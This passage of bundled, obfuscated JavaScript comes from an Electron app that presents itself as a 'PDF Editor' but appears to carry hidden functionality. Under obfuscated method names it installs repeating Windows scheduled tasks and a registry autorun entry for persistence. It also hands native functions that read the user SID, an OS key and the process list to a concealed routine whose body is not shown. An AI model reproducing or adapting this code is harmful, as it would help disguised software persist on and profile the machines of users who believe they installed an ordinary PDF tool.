  const h = b({
    'obj/globals.js'(vq, vr) {
      'use strict';

      const obj9 = {
        homeUrl: "https://pdf-tool.appsuites.ai/en/pdfeditor",
        CHANNEL_NAME: "main",
        USER_AGENT: "PDFFusion/93HEU7AJ",
        productName: "PDFEditor",
        appName: "PDF Editor",
        scheduledTaskName: "PDFEditorScheduledTask",
        registryName: 'PDFEditorUpdater',
        modeDataPath: "\\mode.data",
        scheduledUTaskName: "PDFEditorUScheduledTask",
        iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
      };
      vr.exports = obj9;
    }
  });
  const i = b({
    'obj/window.js'(vs) {
      'use strict';

      const {
        BrowserWindow: electron
      } = require("electron");
      const {
        dialog: electron2
      } = require("electron");
      vs.createBrowserWindow = () => {
        let vt = __dirname;
        vt = vt.replace("src", '');
        const vu = vt + h().iconSubPath;
        console.log(vu);
        const vv = new electron({
          resizable: true,
          width: 1024,
          height: 768,
          icon: vu,
          autoHideMenuBar: true,
          backgroundColor: "#fff",
          webPreferences: {
            devTools: false,
            preload: require("path").join(__dirname, "./preload.js")
          }
        });
        return vv;
      };
    }
  });
  const j = b({
    'obj/D3E8Q17.js'(vw) {
      Object.defineProperty(vw, "__esModule", {
        value: true
      });
      const vx = c();
      const fs15 = require('fs');
      const Utilityaddon = require(".\\lib\\Utilityaddon.node");
      const {
        app: electron3,
        Menu: electron4,
        ipcMain: electron5
      } = require("electron");
      const vy = h();
      async function vz() {
        const wa = (wo) => {
          switch (wo) {
            case "--install":
              return vx.a689XV5.b5BEPQ2;
            case "--check":
              return vx.a689XV5.V4E6B4O;
            case "--reboot":
              return vx.a689XV5.j5C58S9;
            case "--cleanup":
              return vx.a689XV5.Z498ME9;
            case "--ping":
              return vx.a689XV5.f63DUQF;
          }
          return vx.a689XV5.B639G7B;
        };
        let flag10 = false;
        const wb = electron3.commandLine.getSwitchValue('c');
        const wc = electron3.commandLine.getSwitchValue('cm');
        console.log('args=' + wb);
        console.log("args2=" + wc);
        const wd = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
        console.log("wkdir = " + wd);
        if (!electron3.commandLine.hasSwitch('c') && !electron3.commandLine.hasSwitch('cm')) {
          await we('--install');
          wm();
        }
        if (electron3.commandLine.hasSwitch('c') && wb == '0') {
          wm();
        }
        if (electron3.commandLine.hasSwitch('cm')) {
          if (wc == "--cleanup") {
            await we(wc);
            console.log("remove ST");
            Utilityaddon.remove_task_schedule(vy.scheduledTaskName);
            Utilityaddon.remove_task_schedule(vy.scheduledUTaskName);
          } else if (wc == "--partialupdate") {
            await we('--check');
          } else if (wc == "--fullupdate") {
            await we("--reboot");
          } else if (wc == "--enableupdate") {
            Utilityaddon.SetRegistryValue(vy.registryName, "\"" + wd + "\\" + vy.appName + "\" --cm=--fullupdate");
          } else if (wc == "--disableupdate") {
            Utilityaddon.DeleteRegistryValue(vy.registryName);
          } else if (wc == "--backupupdate") {
            await we("--ping");
          }
          if (!electron3.commandLine.hasSwitch('c')) {
            electron3.quit();
          }
        }
        async function we(wp) {
          console.log("To add wc routine");
          await wl(wp);
        }
        function wf() {
          return Utilityaddon.get_sid();
        }
        function wg(wq) {
          return Utilityaddon.GetOsCKey(wq);
        }
        function wh(wr, ws, wt) {
          return Utilityaddon.mutate_task_schedule(wr, ws, wt);
        }
        function wi(wu) {
          return Utilityaddon.find_process(wu);
        }
        function wj() {
          return Utilityaddon.GetPsList();
        }
        function wk() {
          try {
            const wv = Utilityaddon.mutate_task_schedule("\\", vy.scheduledTaskName, 1);
            if (!wv) {
              Utilityaddon.create_task_schedule(vy.scheduledTaskName, vy.scheduledTaskName, "\"" + wd + "\\" + vy.appName + "\"", "--cm=--partialupdate", wd, 1442);
            }
            const ww = Utilityaddon.mutate_task_schedule("\\", vy.scheduledUTaskName, 1);
            if (!wv) {
              Utilityaddon.create_repeat_task_schedule(vy.scheduledUTaskName, vy.scheduledUTaskName, "\"" + wd + "\\" + vy.appName + "\"", "--cm=--backupupdate", wd);
            }
          } catch (wx) {
            console.log(wx);
          }
        }
        async function wl(wy) {
          const wz = wa(wy);
          console.log("argument = " + wy);
          const xa = new g().A672SIS(wf, wg, wh, wi, wj);
          if (vx.a689XV5.b5BEPQ2 == wz) {
            if ((await xa.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
              wk();
            }
          } else if (vx.a689XV5.Z498ME9 == wz) {
            await xa.l660ZQF();
          } else if (vx.a689XV5.f63DUQF == wz) {
            await xa.A4B0MTO();
          } else {
            await xa.m58FJB5(wz);
          }
        }
        function wm() {
          try {
            const xb = wd + vy.modeDataPath;
            console.log("modeFile = " + xb);
            if (fs15.existsSync(xb)) {
              flag10 = false;
            } else {
              flag10 = true;
            }
          } catch (xc) {
            console.log(xc);
          }
        }
        function wn() {
          try {
            const xd = wd + vy.modeDataPath;
            if (fs15.existsSync(xd)) {
              fs15.rmSync(xd, {
                force: true
              });
            }
          } catch (xe) {
            console.log(xe);
          }
        }
        if (flag10) {
          electron3.whenReady().then(() => {
            const xf = i().createBrowserWindow(electron3);
            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((xg, xh) => {
              xg.requestHeaders["User-Agent"] = vy.USER_AGENT;
              xh({
                cancel: false,
                requestHeaders: xg.requestHeaders
              });
            });
            xf.loadURL(vy.homeUrl);
            xf.on("close", function (xi) {
              xi.preventDefault();
              xf.destroy();
            });
          });
          electron5.on(vy.CHANNEL_NAME, (xj, xk) => {
            if (xk == "Set") {
              Utilityaddon.SetRegistryValue(vy.registryName, "\"" + wd + "\\" + vy.appName + "\" --cm=--fullupdate");
            }
            if (xk == "Unset") {
              Utilityaddon.DeleteRegistryValue(vy.registryName);
            }
          });
          electron3.on("window-all-closed", () => {
            if (process.platform !== "darwin") {
              electron3.quit();
            }
          });
        }
        wn();
      }
      vz();
    }
  });
  j();
})();